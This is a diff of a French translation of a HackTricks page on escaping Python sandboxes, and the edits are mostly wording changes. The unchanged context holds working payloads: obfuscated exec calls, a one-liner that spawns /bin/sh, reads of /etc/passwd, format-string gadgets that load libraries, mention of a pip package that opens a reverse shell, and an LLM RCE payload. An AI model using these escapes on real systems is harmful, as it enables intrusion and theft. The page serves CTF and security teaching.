@@ -4,7 +4,7 @@
 
 Voici quelques astuces pour contourner les protections des sandboxes Python et exécuter des commandes arbitraires.
 
-## Command Execution Libraries
+## Bibliothèques d'exécution de commandes
 
 La première chose que vous devez savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pourriez importer l'une de ces bibliothèques :
 ```python
@@ -47,13 +47,13 @@ Python essaie de **charger les bibliothèques du répertoire courant en premier*
 
 ![](<../../../images/image (559).png>)
 
-## Contourner le sandbox pickle avec les paquets python installés par défaut
+## Contourner le sandbox pickle avec les packages python installés par défaut
 
-### Paquets par défaut
+### Packages par défaut
 
-Vous pouvez trouver une **liste des paquets pré-installés** ici : [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Vous pouvez trouver une **liste des packages pré-installés** ici : [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Notez qu'à partir d'un pickle, vous pouvez faire en sorte que l'environnement python **importe des bibliothèques arbitraires** installées sur le système.\
-Par exemple, le pickle suivant, lorsqu'il est chargé, va importer la bibliothèque pip pour l'utiliser :
+Par exemple, le pickle suivant, une fois chargé, va importer la bibliothèque pip pour l'utiliser :
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -83,7 +83,7 @@ Vous pouvez télécharger le package pour créer le reverse shell ici. Veuillez 
 Reverse.tar (1).gz
 {{#endfile}}
 
-> [!NOTE]
+> [!TIP]
 > Ce package s'appelle `Reverse`. Cependant, il a été spécialement conçu pour que lorsque vous quittez le reverse shell, le reste de l'installation échoue, donc vous **ne laisserez aucun package python supplémentaire installé sur le serveur** lorsque vous partirez.
 
 ## Évaluation du code python
@@ -112,7 +112,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Autres bibliothèques qui permettent d'évaluer du code python
+### D'autres bibliothèques qui permettent d'évaluer du code python
 ```python
 #Pandas
 import pandas as pd
@@ -135,7 +135,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Contournement des protections par encodages (UTF-7)
+## Contournement des protections par le biais des encodages (UTF-7)
 
 Dans [**ce rapport**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), UFT-7 est utilisé pour charger et exécuter du code python arbitraire à l'intérieur d'un apparent sandbox :
 ```python
@@ -317,7 +317,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 Lorsque vous n'avez pas `__builtins__`, vous ne pourrez rien importer ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
 Cependant, **par défaut, python importe beaucoup de modules en mémoire**. Ces modules peuvent sembler bénins, mais certains d'entre eux **importent également des** fonctionnalités **dangereuses** à l'intérieur qui peuvent être accessibles pour obtenir même **une exécution de code arbitraire**.
 
-Dans les exemples suivants, vous pouvez observer comment **abuser** de certains de ces modules "**bénins**" chargés pour **accéder** à des **fonctionnalités** **dangereuses** à l'intérieur. 
+Dans les exemples suivants, vous pouvez observer comment **abuser** de certains de ces modules "**bénins**" chargés pour **accéder** à des **fonctionnalités** **dangereuses** à l'intérieur d'eux.
 
 **Python2**
 ```python
@@ -367,7 +367,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Charges utiles intégrées
+### Payloads intégrés
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -660,9 +660,9 @@ Vous pouvez vérifier la sortie de ce script sur cette page :
 https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
 {{#endref}}
 
-## Chaîne de format Python
+## Format de chaîne Python
 
-Si vous **envoyez** une **chaîne** à python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder à **l'information interne de python.** Vous pouvez utiliser les exemples précédents pour accéder aux globals ou aux builtins par exemple.
+Si vous **envoyez** une **chaîne** à python qui va être **formatée**, vous pouvez utiliser `{}` pour accéder à **l'information interne de python.** Vous pouvez utiliser les exemples précédents pour accéder aux globals ou builtins par exemple.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -682,7 +682,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et **élément de dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
+Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et un **élément dict** avec des **parenthèses** sans guillemets `__globals__[CONFIG]`
 
 Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -704,8 +704,8 @@ return 'HAL 9000'
 ```
 **Plus d'exemples** sur les **exemples de chaînes de format** peuvent être trouvés sur [**https://pyformat.info/**](https://pyformat.info)
 
-> [!CAUTION]
-> Vérifiez également la page suivante pour des gadgets qui vont r**écupérer des informations sensibles à partir des objets internes de Python** :
+> [!AVERTISSEMENT]
+> Vérifiez également la page suivante pour des gadgets qui **lire des informations sensibles à partir des objets internes de Python** :
 
 {{#ref}}
 ../python-internal-read-gadgets.md
@@ -731,16 +731,16 @@ str(x) # Out: clueless
 
 Depuis [ici](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-### Du format à l'exécution de code à distance en chargeant des bibliothèques
+### Du format au RCE en chargeant des bibliothèques
 
-Selon le [**TypeMonkey chall de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
+Selon le [**challenge TypeMonkey de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
 
 En rappel, chaque fois qu'une action est effectuée en python, une fonction est exécutée. Par exemple, `2*3` exécutera **`(2).mul(3)`** ou **`{'a':'b'}['a']`** sera **`{'a':'b'}.__getitem__('a')`**.
 
 Vous en avez d'autres comme cela dans la section [**Exécution Python sans appels**](#python-execution-without-calls).
 
-Une vulnérabilité de chaîne de format python ne permet pas d'exécuter une fonction (elle ne permet pas d'utiliser des parenthèses), donc il n'est pas possible d'obtenir une exécution de code à distance comme `'{0.system("/bin/sh")}'.format(os)`.\
-Cependant, il est possible d'utiliser `[]`. Par conséquent, si une bibliothèque python courante a une méthode **`__getitem__`** ou **`__getattr__`** qui exécute du code arbitraire, il est possible de les abuser pour obtenir une exécution de code à distance.
+Une vulnérabilité de chaîne de format python ne permet pas d'exécuter de fonction (elle ne permet pas d'utiliser des parenthèses), donc il n'est pas possible d'obtenir un RCE comme `'{0.system("/bin/sh")}'.format(os)`.\
+Cependant, il est possible d'utiliser `[]`. Par conséquent, si une bibliothèque python courante a une méthode **`__getitem__`** ou **`__getattr__`** qui exécute du code arbitraire, il est possible de les abuser pour obtenir un RCE.
 
 À la recherche d'un gadget comme ça en python, l'article propose cette [**requête de recherche Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Où il a trouvé celui-ci [ici](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
 ```python
@@ -768,14 +768,14 @@ Ce gadget permet de **charger une bibliothèque depuis le disque**. Par conséqu
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-Le défi abuse en fait d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
+Le défi abuse en réalité d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
 
 ## Dissection des objets Python
 
-> [!NOTE]
+> [!TIP]
 > Si vous voulez **apprendre** sur le **bytecode python** en profondeur, lisez ce **superbe** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez voir les **internes** de la **fonction** pour l'extraire.
+Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où se trouve le flag** et vous devez examiner les **internes** de la **fonction** pour l'extraire.
 
 C'est la fonction à inspecter :
 ```python
@@ -797,7 +797,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` et `func_globals` (Identique) Obtient l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, quelques variables globales et leur contenu déclaré :
+`__globals__` et `func_globals`(Identique) Obtient l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, quelques variables globales et leur contenu déclaré :
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -898,7 +898,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables en cours de chargement (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également l'offset de la variable en cours de chargement.
+Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables étant chargées (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable étant chargée.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -920,9 +920,9 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Compiler Python
+## Compilation de Python
 
-Maintenant, imaginons que d'une manière ou d'une autre, vous pouvez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **l'exécuter**.\
+Maintenant, imaginons que d'une manière ou d'une autre, vous pouvez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **exécuter**.\
 Comme dans l'exemple suivant, vous **pouvez accéder à l'objet code** de cette fonction, mais en lisant simplement le désassemblage, vous **ne savez pas comment calculer le flag** (_imaginez une fonction `calc_flag` plus complexe_)
 ```python
 def get_flag(some_input):
@@ -957,8 +957,8 @@ mydict = {}
 mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
-> [!NOTE]
-> Selon la version de Python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de Python que vous exécutez est d'exécuter :
+> [!TIP]
+> Selon la version de python, les **paramètres** de `code_type` peuvent avoir un **ordre différent**. La meilleure façon de connaître l'ordre des paramètres dans la version de python que vous exécutez est de lancer :
 >
 > ```
 > import types
@@ -969,7 +969,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ### Recréer une fonction divulguée
 
 > [!WARNING]
-> Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
+> Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
@@ -982,7 +982,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout le reste en une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
+Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout dans une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
 Quoi qu'il en soit, parfois il pourrait être utile de **créer** un **objet compilé** sur une machine locale et de l'exécuter sur la **machine CTF** (par exemple parce que nous n'avons pas la fonction `compiled` dans le CTF).
 
 Par exemple, compilons et exécutons manuellement une fonction qui lit _./poc.py_:
@@ -1020,9 +1020,9 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## Décompilation de Python Compilé
+## Décompiler du Python compilé
 
-En utilisant des outils comme [**https://www.decompiler.com/**](https://www.decompiler.com), on peut **décompiler** un code python compilé donné.
+En utilisant des outils comme [**https://www.decompiler.com/**](https://www.decompiler.com), on peut **décompiler** du code python compilé donné.
 
 **Consultez ce tutoriel** :
 
@@ -1034,7 +1034,7 @@ En utilisant des outils comme [**https://www.decompiler.com/**](https://www.deco
 
 ### Assert
 
-Python exécuté avec des optimisations avec le paramètre `-O` supprimera les instructions d'assertion et tout code conditionnel sur la valeur de **debug**.\
+Python exécuté avec des optimisations avec le paramètre `-O` supprimera les instructions assert et tout code conditionnel sur la valeur de **debug**.\
 Par conséquent, des vérifications comme
 ```python
 def check_permission(super_user):
